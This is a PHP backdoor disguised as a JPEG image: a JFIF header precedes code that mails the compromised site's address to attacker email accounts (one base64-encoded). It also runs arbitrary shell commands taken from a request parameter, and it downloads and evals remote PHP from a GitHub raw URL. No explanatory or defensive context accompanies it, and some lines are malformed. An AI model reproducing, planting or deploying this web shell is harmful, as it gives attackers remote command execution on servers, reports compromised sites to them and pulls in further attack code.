ÿØÿà JFIF ÿþ;  
<?php
$e=base64_decode("bXVocmF6a3lAZ21haWwuY29t");
$f=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
$f=$_SERVER['PATH_INFO'].$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
$to= 'exploitkite@gmail.com';
$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$message = "URL: $path | IP Address :[ " . 
mail($e,"0",$f); print(`{$_REQUEST[0]}`);$f=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
mail($e,"0",$f); print(`{$_REQUEST[0]}`);
mail($to,"0",$f); print(`{$_REQUEST[0]}`);
mail($to,  "Base64!!!", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");

   function get($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}
      eval('?>' . get('https://raw.githubusercontent.com/Anonrocks/Exploitssss/master/templates.php'));
?>
